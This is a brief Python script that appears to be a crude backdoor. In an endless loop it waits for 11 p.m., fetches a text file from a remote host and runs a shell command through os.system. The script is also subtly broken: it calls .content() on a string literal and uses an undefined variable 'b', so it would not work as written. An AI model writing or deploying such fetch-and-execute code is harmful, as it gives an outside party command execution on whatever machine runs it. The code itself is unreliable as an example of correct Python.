#!/usr/bin/python3

import datetime, os, urllib.request

while True:
    if datetime.datetime.now().hour == 23:
        if urllib.request.urlopen('https://mtrx.ir/c.txt'.content()) != '':
            os.system('{}'.format(b))
